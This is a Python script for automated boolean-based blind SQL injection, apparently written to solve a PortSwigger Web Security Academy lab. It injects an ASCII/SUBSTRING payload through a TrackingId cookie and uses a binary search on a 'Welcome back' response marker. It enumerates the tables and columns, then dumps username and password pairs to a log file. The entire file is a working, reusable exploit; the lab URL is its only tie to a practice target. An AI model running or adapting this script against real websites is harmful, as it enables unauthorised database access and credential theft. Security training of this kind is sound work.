#!/usr/bin/python3
# ب
# Author: Şefik Efe aka f4T1H21 *** See https://github.com/f4T1H21/Blind-SQL-Injection for detailed information.
import requests
import re
from urllib import parse
import time

def setVars():      # Function to update variables before moving on each new character in binary search algorithm.
    global value, upperlimit, lowerlimit, operator
    value = 102
    upperlimit = 176
    lowerlimit = 31
    operator = ">"

def setPayload():   # Function to update variables before each http request.
    global payload, cookie
    payload = f"'AND ASCII(SUBSTRING(({query} LIMIT 1 OFFSET {row}),{charNum},1)) {operator} {value}--" # SQLi payload for comparison
    cookie = {"TrackingId": "d7mf862Y5vayhjFe" + payload} # SQL injectible cookie

queries = [ # Queries to dump various data from database
    "SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema()",
    "SELECT column_name FROM information_schema.columns WHERE table_schema=current_schema() AND table_name='{}'",
    "SELECT CONCAT({},'::',{}) FROM {}"
]

setVars()
url = "https://ac861f471f5c8330c0df67c800c200d4.web-security-academy.net/"
pattern = "Welcome back"    # The repeated pattern which takes place in HTTP response body for only the queries that returns rows.
query = queries[0]
row = 0         # Row number
charNum = 1     # The place of character in row
timeoutDelay = 10
timehascame = 0 # Control variable of return status
count = 1       # Counting variable for HTTP requests sent
word = list()   # Current word
result = list() # The list that stores all the dumped data since the beginning of the process

try:
    r = requests.get(url, timeout=timeoutDelay, allow_redirects=False)
    if r.status_code != 200: # Check if the website responds HTTP 200 OK.
        print(f"[-] An Error occured, HTTP (GET) response status: {r.status_code}")
        exit(1)
    filename = f"sqli-dumped-data_{parse.urlsplit(url)[1]}_.txt"
    now = time.localtime()  # Get local date and time.
    start = time.time()     # Get the time in seconds since the epoch which is January 1, 1970, 00:00:00 (UTC) on Windows and most Unix systems.
    with open(filename, "w") as f:  # Create a log file and write initial information.
        f.write(f"[i] Started in: {time.strftime('%Y/%m/%d %H:%M:%S', now)}\n-----------------------------------\n")
        print(f"[i] Log file created: {filename}")
    print(f"[*] Starting binary search with the query: {query};\n")

    while True:
        setPayload()
        r = requests.get(url, cookies=cookie, timeout=timeoutDelay, allow_redirects=False)
        count += 1
        if r.status_code == 200:
            if pattern in r.text:   # Binary search algorithm for characters between current value and upper limit
                lowerlimit = value
                value = (value+upperlimit)/2
                if (upperlimit-value) <= 1: # 99% that the rounded value of one of two is the correct value we're looking for.
                    operator = "="
                    possibleValue1 = round(upperlimit)
                    possibleValue2 = round(value)

                    value = possibleValue1
                    setPayload()
                    r = requests.get(url, cookies=cookie, timeout=timeoutDelay, allow_redirects=False)
                    count += 1

                    if r.status_code == 200 and pattern in r.text:
                        char = chr(value)
                        print(f"[+] {charNum}. character of {row+1}. row has been dumped: {char}")
                        charNum += 1    # Settings to dump the next character of the current row
                        setVars()
                    elif r.status_code == 200 and pattern not in r.text:
                        value = possibleValue2
                        setPayload()
                        r = requests.get(url, cookies=cookie, timeout=timeoutDelay, allow_redirects=False)
                        count += 1
                        if pattern in r.text:
                            char = chr(value)
                            print(f"[+] {charNum}. character of {row+1}. row has been dumped: {char}")
                            charNum += 1    # Settings to dump the next character of the current row
                            setVars()
                        else:
                            print("\n[-] An error occured, HTTP response status: " + str(r.status_code))
                            exit(1)
                    else:
                        print("\n[-] An error occured, HTTP response status: " + str(r.status_code))
                        exit(1)
                    
                    word.append(char)
                    print(f"[+] Word ==> {''.join(word)}\n")

            elif pattern not in r.text:     # Binary search algorithm for characters between current value and lower limit
                upperlimit = value
                value = (lowerlimit+value)/2
                if (value-31) <= 1:             # No undumped character left in the current row, continue dumping the next row returned by query.
                    result.append(''.join(word))
                    if result[len(result)-1] == '': # No undumped rows left, continue with the next query.
                        timehascame += 1
                        del result[-1]      # Delete the null string which added during the understanding process of no undumped rows left.
                        result.append("\n") # Add a newline character to the list in order to understand that there's enough items in the list for indexing new list after splitting.
                        if "\n\n" in ''.join(result):
                            fileContent = [ # The list that includes file contents as the rows returned from the current query and the current query itself.
                                query, ";\n",
                                ''.join(result).split("\n\n")[timehascame-1],
                                "\n\n",
                            ]
                            with open(filename, "a") as f:  # Write (append) dumped rows with their corresponding queries to the log file.
                                f.writelines(fileContent)
                                print(f"[*] Dumped data written to: {filename}\n")

                        del result[-1]      # Delete the newline character added @ line 102.

                        if timehascame == 1:    # For the 1st time no undumped rows left.
                            t = re.compile(".*users*.", re.IGNORECASE)      # Compile 'users' pattern ignoring case distinctions.
                            table_name = list(filter(t.search, result))[0]  # Search 'users' expression as table name in result list.
                            query = queries[1].format(table_name)           # Change the query for the next step with new variables.
                        elif timehascame == 2:  # For the 2nd time no undumped rows left.
                            u = re.compile(".*username*.", re.IGNORECASE)                           # Compile 'username' pattern ignoring case distinctions.
                            p = re.compile(".*password*.", re.IGNORECASE)                           # Compile 'password' pattern ignoring case distinctions.
                            usernameColumn = list(filter(u.search, result))[0]                      # Search 'username' expression as column name in result list.
                            passwordColumn = list(filter(p.search, result))[0]                      # Search 'password' expression as column name in result list.
                            query = queries[2].format(usernameColumn, passwordColumn, table_name)   # Change the query for the next step with new variables.
                        elif timehascame == 3:  # For the 3rd time no undumped rows left.
                            now = time.localtime()  # Get local date and time.
                            end = time.time()       # Get the time in seconds since the epoch.
                            print(f"[*] No more rows is being returned from current query!\n[*] No other query remained!")
                            with open(filename, "a") as f:  # Write (append) additional information about process to the log file.
                                f.write(f"------------------------------------\n[i] Finished in: {time.strftime('%Y/%m/%d %H:%M:%S', now)}\n[i] Took {round((end - start)/60)} minutes.\n[i] {count} HTTP requests sent in total.\n[i] {round(count/(end - start),1)} request per second.\n")
                            with open(filename, "r") as f:  # Read the log file and exit.
                                print(f"\n\n{filename}\n{''.join('=' for i in range(len(filename)))}\n{f.read()[:-1]}\n\n    Exited!\n")
                            exit()

                        row = -1    # We need this to be 0 and it will @ line 141.
                        print(f"[*] No more rows is being returned from current query!\n[*] Continuing with the next query: {query};\n")

                    result.append("\n") # Add a newline character in order to make different lines seperated from each other when the list is converted to string.
                    print(f"[*] Dumped data so far:\n{''.join(result)}")
                    word.clear()    # Settings to dump the next row of the rows returned by query
                    row += 1
                    charNum = 1
                    setVars()

        else:
            print("\n[-] An error occured, HTTP response status: " + str(r.status_code))
            exit(1)

except KeyboardInterrupt:
    print("\n\n    Keyboard interrupt, exited!\n")
    exit()

except Exception as e:
    print(f"\n[-] Program failed because of: {e}\n")